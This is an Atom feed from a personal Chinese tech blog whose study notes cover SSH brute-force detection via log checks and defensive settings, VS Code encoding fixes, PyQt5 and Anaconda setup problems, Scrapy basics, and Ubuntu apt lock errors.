<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hezhing&#39;s Blog</title>
  
  <subtitle>越努力，越幸运。</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://zhihening.me/"/>
  <updated>2020-08-18T11:53:30.360Z</updated>
  <id>http://zhihening.me/</id>
  
  <author>
    <name>Hezhing</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Redis未授权访问漏洞学习</title>
    <link href="http://zhihening.me/2020/08/18/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <id>http://zhihening.me/2020/08/18/Redis未授权访问漏洞学习/</id>
    <published>2020-08-18T11:53:30.000Z</published>
    <updated>2020-08-18T11:53:30.360Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SSH暴力破解学习</title>
    <link href="http://zhihening.me/2020/08/18/SSH%E7%88%86%E7%A0%B4%E5%AD%A6%E4%B9%A0/"/>
    <id>http://zhihening.me/2020/08/18/SSH爆破学习/</id>
    <published>2020-08-18T01:37:01.000Z</published>
    <updated>2020-08-18T11:51:21.965Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SSH暴力破解描述"><a href="#SSH暴力破解描述" class="headerlink" title="SSH暴力破解描述"></a>SSH暴力破解描述</h2><p>ssh暴力破解是指攻击者通过密码字典或随机组合密码的方式尝试登陆服务器（针对的是全网机器）</p><a id="more"></a><h2 id="检测暴力破解攻击"><a href="#检测暴力破解攻击" class="headerlink" title="检测暴力破解攻击"></a>检测暴力破解攻击</h2><h3 id="1-查看近期登陆日志"><a href="#1-查看近期登陆日志" class="headerlink" title="1.查看近期登陆日志"></a>1.查看近期登陆日志</h3><p>命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/log/secure</span><br></pre></td></tr></table></figure></p><h3 id="2-计算近期失败的登陆次数"><a href="#2-计算近期失败的登陆次数" class="headerlink" title="2.计算近期失败的登陆次数"></a>2.计算近期失败的登陆次数</h3><p>命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/log/secure|grep &apos;Failed password for root&apos;|wc -l</span><br></pre></td></tr></table></figure></p><h2 id="暴力破解攻击防御"><a href="#暴力破解攻击防御" class="headerlink" title="暴力破解攻击防御"></a>暴力破解攻击防御</h2><h3 id="1-系统及网络安全"><a href="#1-系统及网络安全" class="headerlink" title="1.系统及网络安全"></a>1.系统及网络安全</h3><p>(1) 定期检查并修复系统漏洞</p><p>(2)定期修改SSH密码，或者配置证书登陆</p><p>(3)修改SSH端口</p><p>(4)禁Ping</p><p>(5)如果长期不用SSH，则将SSH服务关闭</p><p>(6)安装悬镜、云锁、安全狗等软件（一个就好）</p><h3 id="2-查看已经登陆成功的日志"><a href="#2-查看已经登陆成功的日志" class="headerlink" title="2.查看已经登陆成功的日志"></a>2.查看已经登陆成功的日志</h3><p>命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/log/secure|grep &apos;Accepted password&apos;</span><br></pre></td></tr></table></figure></p><p>参考自：<a href="https://www.cnblogs.com/rui517hua20/p/13096886.html" target="_blank" rel="noopener">SSH暴力破解的解读与防御</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;SSH暴力破解描述&quot;&gt;&lt;a href=&quot;#SSH暴力破解描述&quot; class=&quot;headerlink&quot; title=&quot;SSH暴力破解描述&quot;&gt;&lt;/a&gt;SSH暴力破解描述&lt;/h2&gt;&lt;p&gt;ssh暴力破解是指攻击者通过密码字典或随机组合密码的方式尝试登陆服务器（针对的是全网机器）&lt;/p&gt;
    
    </summary>
    
      <category term="study" scheme="http://zhihening.me/categories/study/"/>
    
    
      <category term="SSH" scheme="http://zhihening.me/tags/SSH/"/>
    
  </entry>
  
  <entry>
    <title>hello2020</title>
    <link href="http://zhihening.me/2020/08/14/hello2020/"/>
    <id>http://zhihening.me/2020/08/14/hello2020/</id>
    <published>2020-08-14T09:33:18.000Z</published>
    <updated>2020-08-14T06:17:24.967Z</updated>
    
    <content type="html"><![CDATA[<p>本网站自2018年6月23日运行以来，共计推送16篇文章，由于种种原因（主要是我太懒），一直未曾更新。但经过深刻反思，决定重新拾起博客，开始更新。欢迎各位大佬指正。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本网站自2018年6月23日运行以来，共计推送16篇文章，由于种种原因（主要是我太懒），一直未曾更新。但经过深刻反思，决定重新拾起博客，开始更新。欢迎各位大佬指正。&lt;/p&gt;

      
    
    </summary>
    
    
      <category term="-life" scheme="http://zhihening.me/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>VScode输出中文编码错误</title>
    <link href="http://zhihening.me/2020/03/06/VScode%E8%BE%93%E5%87%BA%E4%B8%AD%E6%96%87%E7%BC%96%E7%A0%81%E9%94%99%E8%AF%AF/"/>
    <id>http://zhihening.me/2020/03/06/VScode输出中文编码错误/</id>
    <published>2020-03-06T11:00:00.000Z</published>
    <updated>2020-08-14T06:25:54.566Z</updated>
    
    <content type="html"><![CDATA[<h2 id="VScode输出中文编码错误"><a href="#VScode输出中文编码错误" class="headerlink" title="VScode输出中文编码错误"></a>VScode输出中文编码错误</h2><p>在写爬虫的时候，在终端输出一个网页的介绍时，发现报错，出现中文乱码，试了网上的很多办法，有添加环境变量，有修改文件等等，但都不起作用，最后在网上找了一个办法，即：先输入“chcp 65001” 再执行代码。<br><a id="more"></a><br>具体原因我通过网上查找发现</p><p>输入chcp就可以查看活动代码页<br>即可以通过chcp命令查看cmd的编码设置，GBK2312的代码页编号是936，然后改成utf-8的编码即可而utf-8的代码页编号是  65001</p><p>但这种办法每次运行都要输入，所以我又寻找一劳永逸的办法。即：在settings.json文件中添加下面这行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;terminal.integrated.shellArgs.windows&quot;: [&quot;/K&quot;, &quot;chcp 65001&quot;]</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;terminal.integrated.shellArgs.windows&quot;: [&quot;-NoExit&quot;, &quot;/c&quot;, &quot;chcp.com 65001&quot;]</span><br></pre></td></tr></table></figure><h2 id="VS2013运行时出现“无法查找或打开PDB文件”"><a href="#VS2013运行时出现“无法查找或打开PDB文件”" class="headerlink" title="VS2013运行时出现“无法查找或打开PDB文件”"></a>VS2013运行时出现“无法查找或打开PDB文件”</h2><p>（1）说明：使用VS编译程序时出现“无法查找或打开PDB文件”的提示，并且程序无法运行，却又没报错。</p><p><img src="C:\Users\Hezhing\AppData\Roaming\Typora\typora-user-images\1562119680200.png" alt="1562119680200"></p><p>（2）原因：并非代码错误，而是编辑器设置的问题，改一下就好。</p><p>（3）解决办法：</p><p>1.选择菜单栏中“调试 –&gt; 选项”。</p><p>2.在“选项”中，选择“调试 –&gt; 常规”，在右侧选项栏中勾选“”“启用源服务器支持”（包含的 3 个子选项不用勾选），此时会弹出一个安全警报框，选择“是”即可</p><p>3.然后在“选项”对话框中，选择“调试 –&gt; 符号”，在右侧选项栏中勾选“Microsoft符号服务器”，此时会弹出一个提示对话框，点击“确定”即可。同时，对于缓存符号的目录选择“C:\Users”即可。</p><p>4.确定之后，重新运行你的程序，首次运行时，由于编译器会加载所有动态链接库的pdb文件，可能会等到几秒钟。程序运行后，之前输出窗口中的“无法查找或打开pdb文件”的提示不见了，如图：</p><p><img src="C:\Users\Hezhing\AppData\Roaming\Typora\typora-user-images\1562116281686.png" alt="1562116281686"></p><h2 id="VS2013在编译SeetFace时报错"><a href="#VS2013在编译SeetFace时报错" class="headerlink" title="VS2013在编译SeetFace时报错"></a>VS2013在编译SeetFace时报错</h2><p>（1）说明：在按照网上的配置完成后，在编译的时候出现报错“error C1083 无法打开 “opencv2/highgui/highgui.hpp””</p><p>（2）原因：使用的是x64的平台，却在属性管理器中配置的是win32的环境。</p><p>解决办法：</p><p>把win32改成x64。</p><p><img src="C:\Users\Hezhing\AppData\Roaming\Typora\typora-user-images\1562121136456.png" alt="1562121136456"></p><p><img src="C:\Users\Hezhing\AppData\Roaming\Typora\typora-user-images\1562121168355.png" alt="1562121168355"></p><h2 id="VS2013-OpenCV2411-SeetaFace环境配置"><a href="#VS2013-OpenCV2411-SeetaFace环境配置" class="headerlink" title="VS2013+OpenCV2411+SeetaFace环境配置"></a>VS2013+OpenCV2411+SeetaFace环境配置</h2><p>详见链接</p><p><a href="https://blog.csdn.net/u014349384/article/details/76408114" target="_blank" rel="noopener">VS2013+OpenCV2411+SeetaFace环境配置</a></p><h2 id="VS2013在编辑SeetaFace生成FaceAilgnment-lib时报错"><a href="#VS2013在编辑SeetaFace生成FaceAilgnment-lib时报错" class="headerlink" title="VS2013在编辑SeetaFace生成FaceAilgnment.lib时报错"></a>VS2013在编辑SeetaFace生成FaceAilgnment.lib时报错</h2><p>报错信息如下：</p><p><img src="C:\Users\Hezhing\AppData\Roaming\Typora\typora-user-images\1562586109764.png" alt="1562586109764"></p><p>解决方案：</p><p>点击项目属性–&gt;在C/C++中的预处理器中编辑预处理器定义–&gt;添加“_CRT_SECURE_NO_WARNINGS”–&gt;重新生成</p><p><img src="C:\Users\Hezhing\AppData\Roaming\Typora\typora-user-images\1562586142330.png" alt="1562586142330"></p><p><img src="C:\Users\Hezhing\AppData\Roaming\Typora\typora-user-images\1562586168586.png" alt="1562586168586"></p><p><img src="C:\Users\Hezhing\AppData\Roaming\Typora\typora-user-images\1562586192361.png" alt="1562586192361"></p><p><img src="C:\Users\Hezhing\AppData\Roaming\Typora\typora-user-images\1562586220082.png" alt="1562586220082"></p><h2 id="VS2013编译FaceAilgnment报错：msvcr120-dll"><a href="#VS2013编译FaceAilgnment报错：msvcr120-dll" class="headerlink" title="VS2013编译FaceAilgnment报错：msvcr120.dll"></a>VS2013编译FaceAilgnment报错：msvcr120.dll</h2><p>报错如下：</p><p><img src="C:\Users\Hezhing\AppData\Roaming\Typora\typora-user-images\1562588193761.png" alt="1562588193761"></p><p>解决办法： 把这个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#ifdef _WIN32</span><br><span class="line">std::string DATA_DIR = &quot;../../data/&quot;;</span><br><span class="line">std::string MODEL_DIR = &quot;../../model/&quot;;</span><br><span class="line">#else</span><br><span class="line">std::string DATA_DIR = &quot;./data/&quot;;</span><br><span class="line">std::string MODEL_DIR = &quot;./model/&quot;;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure><p>替换成这个：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#ifdef _WIN32</span><br><span class="line">std::string DATA_DIR = &quot;\\data\\&quot;;</span><br><span class="line">std::string MODEL_DIR = &quot;\\\model\\&quot;;</span><br><span class="line">#else</span><br><span class="line">std::string DATA_DIR = &quot;\\data\\&quot;;</span><br><span class="line">std::string MODEL_DIR = &quot;\\model\\&quot;;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;VScode输出中文编码错误&quot;&gt;&lt;a href=&quot;#VScode输出中文编码错误&quot; class=&quot;headerlink&quot; title=&quot;VScode输出中文编码错误&quot;&gt;&lt;/a&gt;VScode输出中文编码错误&lt;/h2&gt;&lt;p&gt;在写爬虫的时候，在终端输出一个网页的介绍时，发现报错，出现中文乱码，试了网上的很多办法，有添加环境变量，有修改文件等等，但都不起作用，最后在网上找了一个办法，即：先输入“chcp 65001” 再执行代码。&lt;br&gt;
    
    </summary>
    
      <category term="study" scheme="http://zhihening.me/categories/study/"/>
    
    
      <category term="VScode" scheme="http://zhihening.me/tags/VScode/"/>
    
  </entry>
  
  <entry>
    <title>PyQt5导入找不到指定模块</title>
    <link href="http://zhihening.me/2020/02/16/PyQt5%E5%AF%BC%E5%85%A5%E6%89%BE%E4%B8%8D%E5%88%B0%E6%8C%87%E5%AE%9A%E6%A8%A1%E5%9D%97%E9%94%99%E8%AF%AF/"/>
    <id>http://zhihening.me/2020/02/16/PyQt5导入找不到指定模块错误/</id>
    <published>2020-02-16T07:00:00.000Z</published>
    <updated>2020-08-14T06:22:45.279Z</updated>
    
    <content type="html"><![CDATA[<p><strong>问题描述：</strong>python3.5.2(Anaconda)安装PyQt5，“DLL load failed: 找不到指定的模块</p><p><strong>一、环境：</strong></p><p>window10（64bit）+anaconda +python3.5 + vsCode</p><a id="more"></a><p><strong>二、问题描述</strong></p><p>首先安装</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install PyQt5</span><br></pre></td></tr></table></figure><p>安装pyqt5-tools</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pyqt5-tools</span><br></pre></td></tr></table></figure><p>测试是否能使用PyQt5</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> QApplication,QWidget</span><br></pre></td></tr></table></figure><p>出现以下现象</p><p><img src="C:\Users\Hezhing\AppData\Roaming\Typora\typora-user-images\image-20200109180341507.png" alt="image-20200109180341507"></p><p><strong>三、原因 </strong></p><p>通过Anaconda 安装的Python缺少了python3.dll。</p><p><strong>四、解决方案</strong></p><p>可以通过去 <a href="https://www.python.org/" target="_blank" rel="noopener">python.org</a>下载所需版本的python安装包并安装，然后从安装目录中拷贝python3.dll文件，粘贴到Anaconda中对应python版本环境的安装目录下。找不到的话：<a href="https://pan.baidu.com/s/1AmVLsu7TkiIib3bSISENkQ" target="_blank" rel="noopener">百度云</a></p><p><img src="C:\Users\Hezhing\AppData\Roaming\Typora\typora-user-images\image-20200109180537282.png" alt="image-20200109180537282"></p><p>然后就可以运行了。</p><p>参考自：<a href="https://blog.csdn.net/Ltime/article/details/71403947" target="_blank" rel="noopener">python3.6.0(Anaconda)安装PyQt5，“DLL load failed: 找不到指定的模块</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;问题描述：&lt;/strong&gt;python3.5.2(Anaconda)安装PyQt5，“DLL load failed: 找不到指定的模块&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;一、环境：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;window10（64bit）+anaconda +python3.5 + vsCode&lt;/p&gt;
    
    </summary>
    
      <category term="study" scheme="http://zhihening.me/categories/study/"/>
    
    
      <category term="PyQt5" scheme="http://zhihening.me/tags/PyQt5/"/>
    
  </entry>
  
  <entry>
    <title>Scrapy框架学习</title>
    <link href="http://zhihening.me/2020/02/06/Scrapy%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/"/>
    <id>http://zhihening.me/2020/02/06/Scrapy框架学习/</id>
    <published>2020-02-06T11:00:00.000Z</published>
    <updated>2020-08-14T06:23:20.815Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-1安装scrapy"><a href="#1-1安装scrapy" class="headerlink" title="1.1安装scrapy"></a>1.1安装scrapy</h3><p>这个过程是异常艰辛的。如果你没有报错的话，那么恭喜你逃过一劫，如果像我一样满屏错，建议百度食用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install scrapy</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="1-2新建项目"><a href="#1-2新建项目" class="headerlink" title="1.2新建项目"></a>1.2新建项目</h3><p>在当前目录下创建一个新的项目文件，与Django类似，在目录下打开cmd输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy startproject 项目名称</span><br></pre></td></tr></table></figure><h3 id="1-3运行爬虫应用"><a href="#1-3运行爬虫应用" class="headerlink" title="1.3运行爬虫应用"></a>1.3运行爬虫应用</h3><p>运行所写的爬虫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy crawl 爬虫应用名称</span><br></pre></td></tr></table></figure><h3 id="yield-Request用法"><a href="#yield-Request用法" class="headerlink" title="yield Request用法"></a>yield Request用法</h3><p>yield Request（url，callback = self.get_name ，meta = {‘name’:novelname,’url’:novelurl}）</p><p>意思是请求新的url，callback跟的是回调函数，指需要用get_name函数来处理这个返回值。返回值会以参数的形式传递给所调用的函数。</p><p>meta是Scrapy中传递额外数据的方法，传递为字典形式。</p><h3 id="提取一段文字中的链接及汉字"><a href="#提取一段文字中的链接及汉字" class="headerlink" title="提取一段文字中的链接及汉字"></a>提取一段文字中的链接及汉字</h3><p>在写爬虫，遇到下面一段，需要提取其中的url和名字，使用正则匹配的方式。正则如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 提取汉字</span><br><span class="line">novelname = re.findall(r&apos;[\u4e00-\u9fa5]+&apos;,str(tds))</span><br><span class="line"># 提取url</span><br><span class="line">novelurl = re.findall(r&apos;&lt;a href=&quot;([a-zA-z]+://[^\s]*)&quot;&apos;, str(tds))</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Hezhing\AppData\Roaming\Typora\typora-user-images\1562665485487.png" alt="1562665485487">.</p><h3 id="SQl语法，创建表和创建表名及运行。"><a href="#SQl语法，创建表和创建表名及运行。" class="headerlink" title="SQl语法，创建表和创建表名及运行。"></a>SQl语法，创建表和创建表名及运行。</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">DROP TABLE IF EXISTS `dd_name`;</span><br><span class="line">CREATE TABLE `dd_name` (</span><br><span class="line">  `id` int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `xs_name` varchar(255) DEFAULT NULL,</span><br><span class="line">  `xs_author` varchar(255) DEFAULT NULL,</span><br><span class="line">  `category` varchar(255) DEFAULT NULL,</span><br><span class="line">  `name_id` varchar(255) DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (`id`)</span><br><span class="line">) ENGINE=InnoDB AUTO_INCREMENT=38 DEFAULT CHARSET=utf8mb4;</span><br></pre></td></tr></table></figure><p>上面是sql语法，执行就会创建一个名为‘dd_name’的表，其中包括‘id’,’xs_name’,’xs_author’,’category’,’name_id’等表头。</p><p>上面语法可以在Nabicat中使用，使用步骤如下：</p><p>1.点击查询</p><p><img src="C:\Users\Hezhing\AppData\Roaming\Typora\typora-user-images\1562850026253.png" alt="1562850026253"></p><p>2.新建查询</p><p><img src="C:\Users\Hezhing\AppData\Roaming\Typora\typora-user-images\1562850047875.png" alt="1562850047875"></p><p>3.把上面的语句粘贴进去，然后点击运行，即可。</p><h2 id="框架中的settings设置"><a href="#框架中的settings设置" class="headerlink" title="框架中的settings设置"></a>框架中的settings设置</h2><p>1.用来设置数据库的内容：</p><p><img src="C:\Users\Hezhing\AppData\Roaming\Typora\typora-user-images\1562850199218.png" alt="1562850199218"></p><p>2.防止重复爬取某一页面：</p><p><img src="C:\Users\Hezhing\AppData\Roaming\Typora\typora-user-images\1562850276151.png" alt="1562850276151"></p><p>3.爬虫爬取的执行函数及其优先级，数字越低优先级越高：</p><p><img src="C:\Users\Hezhing\AppData\Roaming\Typora\typora-user-images\1562850379559.png" alt="1562850379559"></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;1-1安装scrapy&quot;&gt;&lt;a href=&quot;#1-1安装scrapy&quot; class=&quot;headerlink&quot; title=&quot;1.1安装scrapy&quot;&gt;&lt;/a&gt;1.1安装scrapy&lt;/h3&gt;&lt;p&gt;这个过程是异常艰辛的。如果你没有报错的话，那么恭喜你逃过一劫，如果像我一样满屏错，建议百度食用。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;pip install scrapy&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="study" scheme="http://zhihening.me/categories/study/"/>
    
    
      <category term="Scrapy" scheme="http://zhihening.me/tags/Scrapy/"/>
    
  </entry>
  
  <entry>
    <title>Anaconda学习</title>
    <link href="http://zhihening.me/2020/01/06/Anacond%E5%AD%A6%E4%B9%A0/"/>
    <id>http://zhihening.me/2020/01/06/Anacond学习/</id>
    <published>2020-01-06T10:05:00.000Z</published>
    <updated>2020-08-14T06:21:11.663Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Anaconda命令"><a href="#Anaconda命令" class="headerlink" title="Anaconda命令"></a>Anaconda命令</h2><p>创建一个python3.6版本的环境。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda create --name [虚拟环境名] python=3.6</span><br></pre></td></tr></table></figure><a id="more"></a><p>安装好以后使用activate激活/取消激活环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">activate [虚拟环境名] #for windows</span><br><span class="line">deactivate [虚拟环境名]</span><br><span class="line"></span><br><span class="line">source activate [虚拟环境名] # for Linux &amp; Mac</span><br></pre></td></tr></table></figure><p>删除环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda remove --name [虚拟环境名] --all</span><br></pre></td></tr></table></figure><p>查看环境列表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">conda info --env</span><br><span class="line">或者下面这个：</span><br><span class="line">conda env list</span><br></pre></td></tr></table></figure><p>在当前环境下安装anaconda包的集合</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">conda install anaconda</span><br><span class="line">或者在安装创建环境的时候运行如下命令：</span><br><span class="line">conda create -n [虚拟环境名] python=3.6 anaconda</span><br></pre></td></tr></table></figure><h2 id="Anaconda安装新环境报错"><a href="#Anaconda安装新环境报错" class="headerlink" title="Anaconda安装新环境报错"></a>Anaconda安装新环境报错</h2><p>安装新环境的过程中报错如下：</p><p><img src="C:\Users\Hezhing\AppData\Roaming\Typora\typora-user-images\1562048646425.png" alt="1562048646425"></p><p>把C:\Users\Hezhing\.condarc文件中的信息换成下面这个：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">channels:</span><br><span class="line"> - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/</span><br><span class="line"> - https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/bioconda/</span><br><span class="line">show_channel_urls: true</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Hezhing\AppData\Roaming\Typora\typora-user-images\1562049922152.png" alt="1562049922152"></p><p>然后再执行代码就可以了。</p><p><img src="C:\Users\Hezhing\AppData\Roaming\Typora\typora-user-images\1562049946112.png" alt="1562049946112"></p><h2 id="打不开Anaconda-Navigator"><a href="#打不开Anaconda-Navigator" class="headerlink" title="打不开Anaconda-Navigator"></a>打不开Anaconda-Navigator</h2><p>右键，以管理员方式打开。</p><h2 id="Anaconda环境安装时报错"><a href="#Anaconda环境安装时报错" class="headerlink" title="Anaconda环境安装时报错"></a>Anaconda环境安装时报错</h2><p><img src="C:\Users\Hezhing\AppData\Roaming\Typora\typora-user-images\1562050911179.png" alt="1562050911179"></p><p>百度说，是因为有个包没安装成功，再运行一遍就好，再运行一遍后，显示安装成功。</p><p><img src="C:\Users\Hezhing\AppData\Roaming\Typora\typora-user-images\1562050955320.png" alt="1562050955320"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Anaconda命令&quot;&gt;&lt;a href=&quot;#Anaconda命令&quot; class=&quot;headerlink&quot; title=&quot;Anaconda命令&quot;&gt;&lt;/a&gt;Anaconda命令&lt;/h2&gt;&lt;p&gt;创建一个python3.6版本的环境。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;conda create --name [虚拟环境名] python=3.6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="study" scheme="http://zhihening.me/categories/study/"/>
    
    
      <category term="Anaconda" scheme="http://zhihening.me/tags/Anaconda/"/>
    
  </entry>
  
  <entry>
    <title>学习新知识</title>
    <link href="http://zhihening.me/2019/12/06/%E5%AD%A6%E4%B9%A0%E6%96%B0%E7%9F%A5%E8%AF%86/"/>
    <id>http://zhihening.me/2019/12/06/学习新知识/</id>
    <published>2019-12-06T10:00:00.000Z</published>
    <updated>2020-08-14T06:20:52.375Z</updated>
    
    <content type="html"><![CDATA[<h2 id="urljoin函数："><a href="#urljoin函数：" class="headerlink" title="urljoin函数："></a>urljoin函数：</h2><p>​        需要导入urllib包，用法：urllib.parse.urljoin(url1,url2)</p><p>​        说明：拼接两个url的绝对路径</p><a id="more"></a><h2 id="yield用法："><a href="#yield用法：" class="headerlink" title="yield用法："></a>yield用法：</h2><p>​        yield 是一个类似 return 的关键字，迭代一次遇到yield时就返回yield后面(右边)的值</p><p>​        注：下一次迭代时，从上一次迭代遇到的yield后面的代码(下一行)开始执行。return 的作用：如果没有 return，则默认执行至函数完毕，相当于每次迭代都返回一次。</p><h2 id="批量读取json格式文件"><a href="#批量读取json格式文件" class="headerlink" title="批量读取json格式文件"></a>批量读取json格式文件</h2><p>​        前景摘要：要做可视化，之前做热力图分析时，把所有的地点都做成了经纬度坐标的形式，但是在读取的时候遇到了问题。格式是下面这样的：</p><p><img src="C:\Users\Hezhing\AppData\Roaming\Typora\typora-user-images\1561967828116.png" alt="1561967828116"></p><p>​        使用json中的load或者loads读都有报错，网上百度，我使用json.load()报的错要使用json.loads()，使用json.loads()报的错要使用json.load()。</p><p>​        最后实在没有办法，我先把json转成txt，然后逐行读取，使用json里面的dump把每一行都保存成一个json文件，然后在逐个load。最后取数据的时候跟我说str不行，要用int型，然后我直接使用split(‘,’)把整个str字符串分开，然后取出。代码及效果如下图：</p><p><img src="C:\Users\Hezhing\AppData\Roaming\Typora\typora-user-images\1561968335613.png" alt="1561968335613"></p><h2 id="pyecharts环境配置问题"><a href="#pyecharts环境配置问题" class="headerlink" title="pyecharts环境配置问题"></a>pyecharts环境配置问题</h2><p>参考链接：</p><p><a href="https://blog.csdn.net/zqs305082800/article/details/84581299" target="_blank" rel="noopener">pyechart 与jupyter 交互式</a></p><h2 id="Ubuntu使用sudo-apt-get-install-xxx-时报错"><a href="#Ubuntu使用sudo-apt-get-install-xxx-时报错" class="headerlink" title="Ubuntu使用sudo apt-get install xxx 时报错"></a>Ubuntu使用sudo apt-get install xxx 时报错</h2><p><img src="C:\Users\Hezhing\AppData\Roaming\Typora\typora-user-images\1562932876173.png" alt="1562932876173"></p><p>这个问题很可能是有另外一个程序正在运行，导致资源被锁不可用。而导致资源被锁的原因除了真正用另一个终端安装程序外，很可能是上次运行安装或更新没有正常完成导致，可以输入以下命令尝试解决。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo rm /var/cache/apt/archives/lock</span><br><span class="line">sudo rm /var/lib/dpkg/lock</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Hezhing\AppData\Roaming\Typora\typora-user-images\1562932923096.png" alt="1562932923096"></p><p>完美解决。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;urljoin函数：&quot;&gt;&lt;a href=&quot;#urljoin函数：&quot; class=&quot;headerlink&quot; title=&quot;urljoin函数：&quot;&gt;&lt;/a&gt;urljoin函数：&lt;/h2&gt;&lt;p&gt;​        需要导入urllib包，用法：urllib.parse.urljoin(url1,url2)&lt;/p&gt;
